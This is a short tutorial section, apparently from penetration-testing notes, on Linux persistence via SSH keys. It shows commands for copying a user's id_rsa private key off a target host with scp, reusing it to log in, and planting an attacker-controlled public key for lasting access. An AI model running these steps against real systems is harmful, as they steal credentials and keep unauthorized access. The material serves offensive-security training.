### 01.Persistence Using SSH Keys

Because in a corporate environment Linux is used as a server system to host web apps databases etc,, they are accesed remotly by servicess or protocols like SSH. On a Linux system you can log in with a password or a private key.   A private key is like a master key to the system.

If we have the username and password, we can log in by SSH.

```plaintext
ssh accountname@10.10.10.10

(password): 
```

Find if any private key is available on the target computer.

```plaintext
cd .ssh/
```

The private key is **id\_rsa**

The public key is **id\_rsa.pub**

Copy id\_rsa private key to our system via SSH.

```plaintext
scp accountname@10.10.10.10:~/.ssh/id_rsa .

(password):
```

After the file is downloaded to our system, we need to change its permissions.

```plaintext
chmod 400 id_rsa
```

Login with using the private key:

```plaintext
ssh -i id_rsa student@10.10.10.10
```

_**A better way of maintaining persistence via SSH key is to generate key pairs on your system, transfer the public key to the target  in the home directory  of the user  in .SSH directory and keep the private key.**_
